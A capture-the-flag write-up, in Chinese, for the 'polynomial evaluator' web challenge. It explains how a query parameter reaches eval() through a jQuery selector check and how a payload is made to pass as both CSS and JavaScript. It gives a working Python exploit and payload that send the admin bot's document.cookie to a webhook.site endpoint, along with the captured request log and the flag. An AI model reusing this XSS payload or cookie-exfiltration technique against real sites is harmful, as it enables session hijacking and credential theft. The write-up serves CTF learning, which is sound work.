# polynomial evaluator — WRITEUP

**Flag: `K17{P4553D_JQU3RY_4ND_J5_4T_TH3_54M3_TIM3!}`**

（flag 是 admin bot 的 cookie：`token=K17{...}`，通过 XSS 外带到 webhook.site 拿到。）

## 题面

```
Any issues with format? Admin is always on duty!
Connection URL: https://polynomial.secso.cc
```

一个纯前端 React SPA（Express 只做静态托管 + 一个 `POST /report`）。首页有个 "polynomial evaluator" 表单
（`x` / `y` / `formula`，全在 query string 里），下面还有 "Having any issues? Report it to Admin!"：
提交一个 URL，**admin bot 会去访问**。

线上只有一个后端路由：

```
POST /report  url=<same-origin path>   ->  202 "Admin bot visit queued."
错误格式 -> 400 "Invalid URL. Only same-origin challenge paths are allowed."   （> 强制 same-origin）
刷太快 -> 429 "Slow down. Try again in a few seconds."                          （有频控）
```

其余任何 GET 路径都返回同一份 433 字节的 `index.html`（express.static + SPA fallback），所以 flag 不在服务端渲染里，
只能在 admin bot 的浏览器里 —— 标准的"存储型 XSS + bot 带 cookie 访问"。

## 漏洞点：query 参数 `format` 拼进 eval（客户端）

把 `assets/index-0OGNtCbS.js` 拉下来看，核心逻辑是 un-minify 后能直接读的（React + jQuery 3.7.1 的 bundle）：

```js
const x = getQueryValue(params, "x", "1");
const y = getQueryValue(params, "y", "2");
const formula = getQueryValue(params, "formula", "x + y");
const format  = getQueryValue(params, "format", "standard");
const autoEval = params.get("autoEval") === "1";
...
jsx("form", { id: `poly_${format}`, "data-formula": formula, ... })
...
// autoEval=1 时，挂载后 600ms 自动 requestSubmit() -> 触发 submit
```

```js
function findTemplateWithJQuerySelector(selected2) {
  const selector = "#template_" + selected2;   // selected = form.id.replace("poly_", "") == format
  return $(selector);
}
$(document).on("submit", "form[id^='poly_']", function (event) {
  event.preventDefault();
  const selected = getSelectedFormatter(this);          // = format
  ...
  try { template = findTemplateWithJQuerySelector(selected); }
  catch (error) { writeAnswer("Formatter selector error."); return; }   // ← jQuery 选择器炸了就 return
  if (template.length === 0) {
    try {
      let type_;                                                        // ← 注意 type_ 是 undefined
      const answer = eval(`type_${selected}(this, selected)`);           // ← 注入点
      writeAnswer(answer);
    } catch (error) { writeAnswer("Formatter error."); }
    return;
  }
  type_standard(this, selected);
});
```

`format` 只在一处被使用：拼成 eval 的源码 `type_<format>(this, selected)`。但是有**两道门**：

1. `#template_<format>` 必须能被 jQuery 选中且 **length === 0**（否则走 `type_standard`，没有 eval），
2. `$()` 抛异常会被 catch 掉直接 return —— 所以 payload 必须 **同时是一个合法的 CSS 选择器**。

`type_` 在 eval 里是个 `let type_`（值 undefined），所以 `type_` + payload 会被当成标识符粘在一起。构造要点：

- **用 `void` 强制 ASI**：`type_\nvoid [ ... ]` —— `type_` 和 `void` 无法构成一个表达式、中间有换行，
  于是自动插入分号，`type_` 变成一条独立（无害）语句，后面才是我们的代码。
  （不能用 `[`/`(` 开头：`type_[...]` 会被解析成成员访问，直接 TypeError。）
- **整段 payload 必须是合法 CSS 选择器**：换行 = 后代组合器（合法空白），
  `void` = 类型选择器，`[location="..."]` = 属性选择器，`+` = 相邻兄弟组合器，`,` = 选择器列表。
- **字符串里的内容不受 CSS 限制**：`[attr="..."]` 的引号内可以塞任意 `' " ( ) + / : . =` ——
  这就是把任意 JS 代码"走私"进来的通道。

## 利用：把代码放进字符串，用 `javascript:` URL 执行

`[location="X"]` 在 JS 里是数组字面量里的赋值 `location = "X"`（strict 下给已存在的全局属性赋值合法），
并且是**顶层导航** —— 已验证 bot 会真的跳走。所以直接把要执行的代码塞进 `javascript:` URL：

```
format = \nvoid [location="javascript:location='https://webhook.site/<uuid>/js-'+encodeURIComponent(document.cookie)"]
```

- CSS 侧：`#template_ void [location="javascript:location='...'+encodeURIComponent(document.cookie)"]`
  → 合法选择器、匹配不到任何元素 → length 0 ✔
- JS 侧：`type_\nvoid [location="javascript:..."](this, selected)`
  → ASI 后 `location = "javascript:..."` → 导航执行该代码 → 把 cookie 拼到我们的 webhook 上 ✔
  （末尾 `(this, selected)` 会把数组当函数调用抛 TypeError，无所谓：导航已经发出，异常被 app 的 catch 吃掉）

自动触发用 `autoEval=1`（挂载 600ms 后自动 submit）。

### exp

```python
import requests, urllib.parse

BASE  = "https://polynomial.secso.cc"
WB    = "https://webhook.site/<your-uuid>"      # 公网回调，如 webhook.site / 自建
TOKEN = "<your-uuid>"

payload = ("\nvoid [location=\"javascript:location='" + WB
           + "/js-'+encodeURIComponent(document.cookie)\"]")

qs   = urllib.parse.urlencode({"x":"1","y":"2","formula":"x+y",
                               "format":payload, "autoEval":"1"})
path = "/?" + qs

r = requests.post(BASE + "/report", data={"url": path}, timeout=25)
print(r.status_code, r.text)                    # 202 Admin bot visit queued.

# 读回调
d = requests.get(f"https://webhook.site/token/{TOKEN}/requests?sorting=newest", timeout=20).json()
for it in d["data"]:
    print(it["url"])
```

一次命中：

```
GET https://webhook.site/<uuid>/js-token%3DK17%7BP4553D_JQU3RY_4ND_J5_4T_TH3_54M3_TIM3!%7D
Referer: http://127.0.0.1:9999/
UA: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/152.0.0.0 Safari/537.36
```

URL-decode 后：

```
token=K17{P4553D_JQU3RY_4ND_J5_4T_TH3_54M3_TIM3!}
```

**Flag: `K17{P4553D_JQU3RY_4ND_J5_4T_TH3_54M3_TIM3!}`**

## 踩坑 / 备注

- **admin bot 环境**：HeadlessChrome 152，页面实际是 `http://127.0.0.1:9999`（bot 走本机回环访问服务，
  cookie 也绑在这个 origin 上）。bot **有外网**，fetch / 导航到 webhook.site 都能到。
  `Referer` 暴露了 bot 的 base URL，这点很有用（确认它真的访问了）。
- **第一次尝试没用**：先写的是"事件处理器字符串"路子 ——
  `[onhashchange="fetch(...document.cookie)"][location="#x"]` 改 hash 触发 + `[onunhandledrejection="..."]`
  配 `Promise.reject`。本地用 jsdom+jQuery 验过选择器合法、用 node(V8) 验过 handler 字符串能编译执行，
  但线上没收到回调（Chrome 里这条 handler 路径没生效）。换成 `javascript:` URL 后**立刻**命中 —— 
  同一个 payload 形状（引号里塞 `'`、`(`、`)`、`+`）既然这次能过 gate，说明当时炸的不是 CSS，而是 handler 那条路。
- **不要用 `;`、`(`、`)`、`=` 裸写**：这些在 CSS 选择器里非法，`$("#template_"+format)` 会抛
  `Syntax error, unrecognized expression` → 被 catch → 直接 return，eval 根本到不了。
  payload 里所有"真正的 JS 标点"都必须包在 `[...]` 属性选择器的引号内。
- 验证工具：`jsdom`(nwsapi) + 本地 jQuery 3.7.1 复现 `$()` 的那道门；`node` 复现 eval（同一个 V8）。
  两者都过了再打线上，省 bot 的访问次数（`/report` 有频控）。
